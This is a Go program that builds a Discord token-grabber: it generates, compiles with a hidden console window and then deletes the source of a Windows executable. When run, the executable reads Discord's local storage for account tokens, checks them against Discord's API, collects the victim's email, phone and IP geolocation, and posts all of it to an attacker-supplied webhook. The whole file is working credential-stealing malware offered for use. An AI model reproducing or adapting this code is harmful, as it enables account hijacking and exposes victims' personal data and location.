package main

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

//Default Avatar
var avatarURL string = "https://ewscripps.brightspotcdn.com/dims4/default/a19a88b/2147483647/strip/true/crop/494x278+0+36/resize/1280x720!/quality/90/?url=http%3A%2F%2Fewscripps-brightspot.s3.amazonaws.com%2F13%2F78%2F52d35c26458ea53423ece430bfbc%2Fbanana.jpg"

//Default Embed Color
var embedColor string = "39393"

//Default Output Filename
var outputName string = "Token_Grabber.exe"

var userID string = ""

var userRespStruct string = fmt.Sprintf(`
//UserResponseData struct for Discord API Response
type UserResponseData struct {
	ID            string %s
	Username      string %s
	Avatar        string %s
	Discriminator string %s
	Flags         int    %s
	Email         string %s
	MFAEnabled    bool   %s
	Phone         string %s
	PremiumType   int    %s
	Token         string %s
	Message       string %s
	Code          int    %s
	NitroType     string
	UserFlag      string
	AvatarURL     string
	IPData        IPAddressResponseData
}
	`, "`"+"json:"+`"`+"id"+`"`+"`", "`"+"json:"+`"`+"username"+`"`+"`", "`"+"json:"+`"`+"avatar"+`"`+"`", "`"+"json:"+`"`+"discriminator"+`"`+"`", "`"+"json:"+`"`+"flags"+`"`+"`", "`"+"json:"+`"`+"email"+`"`+"`", "`"+"json:"+`"`+"mfa_enabled"+`"`+"`", "`"+"json:"+`"`+"phone"+`"`+"`", "`"+"json:"+`"`+"premium_type"+`"`+"`", "`"+"json:"+`"`+"token"+`"`+"`", "`"+"json:"+`"`+"message"+`"`+"`", "`"+"json:"+`"`+"code"+`"`+"`")

var ipRespStruct string = fmt.Sprintf(`
//IPAddressResponseData struct for IP API Response
type IPAddressResponseData struct {
	IP         string  %s
	Country    string  %s
	RegionName string  %s
	ZipCode    string  %s
	City       string  %s
	Latitude   float64 %s
	Longitude  float64 %s
}
	`, "`"+"json:"+`"`+"ip"+`"`+"`", "`"+"json:"+`"`+"country"+`"`+"`", "`"+"json:"+`"`+"region_name"+`"`+"`", "`"+"json:"+`"`+"zip_code"+`"`+"`", "`"+"json:"+`"`+"city"+`"`+"`", "`"+"json:"+`"`+"latitude"+`"`+"`", "`"+"json:"+`"`+"longitude"+`"`+"`")

//Convert Hexadecimal Color Value to Decimal for Discord Embed
func hexToDecimal(hex string) string {
	val := hex[2:]

	n, err := strconv.ParseUint(val, 16, 32)
	decimalString := strconv.FormatUint(n, 10)
	if err != nil {
		fmt.Println(err)
	}
	return string(decimalString)
}

func generateCode(url string, avatar string, color string, filename string, discordID string) {
	if avatar != "" {
		avatarURL = avatar
	}
	if color != "" {
		if string(color[0]) == "#" {
			color = strings.ReplaceAll(color, "#", "")
			color = "0x" + color
		} else {
			color = "0x" + color
		}
		embedColor = hexToDecimal(color)
	}
	if filename != "" {
		if string(filename[len(filename)-4:]) != ".exe" {
			outputName = filename + ".exe"
		} else {
			outputName = filename
		}
	}
	if discordID != "" {
		userID = "<@" + discordID + ">"
	}
	code := `
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math"
	"net/http"
	"os"
	"regexp"
	"time"
)
` + userRespStruct + `

` + ipRespStruct + `
var (
	webhookURL        string       = "` + url + `"
	webhookAvatar     string       = "` + avatarURL + `"
	flags                          = []int{0, 1, 2, 3, 6, 7, 8, 9, 10, 12, 14, 16, 17}
	client            *http.Client = &http.Client{}
	discordResponse   UserResponseData
	ipAddressResponse IPAddressResponseData

	flagDict = map[int]string{
		0:  "None",
		1:  "Partnered Server Owner",
		2:  "HypeSquad Events",
		3:  "Bug Hunter Level 1",
		6:  "House Bravery",
		7:  "House Brilliance",
		8:  "House Balance",
		9:  "Early Supporter",
		10: "Team User",
		12: "System",
		14: "Bug Hunter Level 2",
		16: "Verified Bot",
		17: "Early Verified Bot Developer",
	}
)

func grabToken() []string {
	var tokens []string
	home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
	if home == "" {
		home = os.Getenv("USERPROFILE")
	}
	files, err := ioutil.ReadDir(home + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb")
	if err != nil {
		fmt.Println(err)
	}
	for file := range files {
		var filename = files[file].Name()
		if filename != "LOCK" {
			r, err := regexp.Compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
			if err != nil {
				fmt.Println(err)
			}

			f, err := ioutil.ReadFile(home + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\" + filename)
			if err != nil {
				fmt.Println(err)
			}
			if r.Match(f) {
				tokens = append(tokens, string(r.Find(f)))
			}
		}
	}
	return tokens
}

func (d UserResponseData) checkTokens(tokens []string) UserResponseData {
	for _, value := range tokens {
		req, err := http.NewRequest("GET", "https://discordapp.com/api/v6/users/@me", nil)
		if err != nil {
			fmt.Println(err)
		}
		req.Header.Add("authorization", value)

		res, err := client.Do(req)
		if err != nil {
			fmt.Println(err)
		}

		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			fmt.Println(err)
		}

		err = json.Unmarshal(body, &d)
		if err == nil {
			if d.Message == "" {
				d.Token = value
				nitro := d.PremiumType
				flag := d.Flags

				switch nitro {
				case 0:
					d.NitroType = "No Nitro"
				case 1:
					d.NitroType = "Nitro Classic"
				case 2:
					d.NitroType = "Nitro"
				}

				for i := range flagDict {
					if int(math.Pow(2, float64(i))) == flag {
						userFlag := flagDict[i]
						d.UserFlag = userFlag
						break
					}
				}
				userID := d.ID
				avatarHash := d.Avatar
				d.AvatarURL = "https://cdn.discordapp.com/avatars/" + userID + "/" + avatarHash + ".webp"

				d.IPData = d.grabIP()
				break
			} else {
				d = UserResponseData{}
			}
		}
	}
	return d
}

func (d UserResponseData) grabIP() IPAddressResponseData {
	req, err := http.NewRequest("GET", "https://ifconfig.co/json", nil)
	if err != nil {
		fmt.Println(err)
	}

	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
	}

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
	}

	err = json.Unmarshal(body, &d.IPData)
	if err != nil {
		fmt.Println(err)
	}
	return d.IPData
}

func sendEmbed(responseData UserResponseData) {
	username := responseData.Username
	disc := responseData.Discriminator
	avatarURL := responseData.AvatarURL
	token := responseData.Token
	email := responseData.Email
	phone := responseData.Phone
	nitro := responseData.NitroType
	mfa := responseData.MFAEnabled
	flag := responseData.UserFlag

	ip := responseData.IPData.IP
	country := responseData.IPData.Country
	region := responseData.IPData.RegionName
	zip := responseData.IPData.ZipCode
	city := responseData.IPData.City
	lat := responseData.IPData.Latitude
	lon := responseData.IPData.Longitude

	currentTime := time.Now().UTC().Format("2006-01-02T15:04:05Z")

	out := fmt.Sprintf(` + "`" + `{"content": "` + userID + `","embeds":[{"title":"New Pull %s#%s","description":"Discord User Information","color":` + embedColor + `,"fields":[{"name":"Token","value":"%s","inline":true},{"name":"Email","value":"%s","inline":true},{"name":"Phone","value":"%s","inline":true},{"name":"Nitro","value":"%s","inline":true},{"name":"MFA","value":"%t","inline":true},{"name":"User Flag","value":"%s","inline":true}],"author":{"name":"Created By RustyBalboadev","url":"https://github.com/rustybalboadev"},"footer":{"text":"Time of Pull"},"timestamp":"%s","thumbnail":{"url":"%s"}},{"title":"IP Information","description":"Discord User IP Information","color":` + embedColor + `,"fields":[{"name":"IP","value":"%s","inline":true},{"name":"Country","value":"%s","inline":true},{"name":"Region","value":"%s","inline":true},{"name":"Zip Code","value":"%s","inline":true},{"name":"City","value":"%s","inline":true},{"name":"(Lat, Long)","value":"%f, %f","inline":true}],"footer":{"text":"Time of Pull"},"timestamp":"%s","thumbnail":{"url":"%s"}}],"username":"Token Grabber","avatar_url":"%s"}` + "`" + `, username, disc, token, email, phone, nitro, mfa, flag, currentTime, avatarURL, ip, country, region, zip, city, lat, lon, currentTime, avatarURL, webhookAvatar)

	jsonStr := []byte(out)
	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonStr))
	req.Header.Set("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
	}
	defer res.Body.Close()
}

func main() {
	tokens := grabToken()
	obj := discordResponse.checkTokens(tokens)
	sendEmbed(obj)
}`
	f, err := os.Create("main.go")
	if err != nil {
		fmt.Println(err)
	}
	_, err = f.Write([]byte(code))
	if err != nil {
		fmt.Println(err)
	}
	for {
		_, err := os.Stat("main.go")
		if err == nil {
			break
		}
	}
	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", outputName, "main.go")
	cmd.Run()
	f.Close()

	err = os.Remove("main.go")
	if err != nil {
		fmt.Println(err)
	}
}
